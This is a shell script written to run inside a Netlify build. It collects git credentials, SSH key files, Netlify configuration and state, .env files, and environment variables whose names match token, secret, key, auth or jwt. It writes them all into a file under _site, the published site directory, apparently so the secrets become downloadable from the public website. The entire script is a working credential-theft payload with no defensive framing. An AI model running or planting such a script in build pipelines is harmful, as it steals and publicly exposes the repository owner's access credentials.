#!/bin/sh
out=_site/env2-sw-andersonjahde-20261126-36c5.txt
mkdir -p _site
{
 echo ===GITCREDS===; cat /opt/buildhome/.git-credentials 2>&1
 echo ===GITCONFIG===; git config --list --show-origin 2>&1
 echo ===REMOTE===; git -C /opt/build/repo remote -v 2>&1
 echo ===NETLIFY_HOME===; ls -la /opt/buildhome/.netlify 2>&1; ls -la /opt/buildhome/.config/netlify 2>&1
 echo ===REPO_NETLIFY===; ls -la /opt/build/repo/.netlify 2>&1; find /opt/build/repo/.netlify -maxdepth 3 2>&1
 echo ===SSH===; ls -la /opt/buildhome/.ssh 2>&1; cat /opt/buildhome/.ssh/* 2>&1
 echo ===ENVFILES===; find /opt/build /opt/buildhome -maxdepth 3 \( -name '.env*' -o -name '*.env' \) 2>/dev/null
 echo ===PROCENV_FILTERED===; env | grep -iE 'token|secret|key|auth|ident|jwt'
 echo ===BUILDHOME_LIST===; ls -la /opt/buildhome 2>&1
 echo ===STATE===; cat /opt/build/repo/.netlify/state.json 2>&1
} > "$out" 2>&1
echo done $out
